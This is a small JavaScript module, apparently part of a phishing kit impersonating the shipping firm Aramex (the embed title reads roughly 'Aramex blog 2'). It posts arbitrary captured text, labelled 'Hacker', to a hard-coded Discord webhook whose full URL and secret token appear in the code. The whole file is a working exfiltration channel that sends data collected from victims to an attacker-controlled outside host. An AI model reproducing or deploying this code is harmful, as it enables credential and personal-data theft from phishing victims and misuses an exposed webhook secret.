import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1333075263721967616/6R8Ba_SScXAatHOcXj_K3AOBStf2_iH74qzT1rNopdzmhS0KyiafOcwkkX_xwvsAAcpv",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
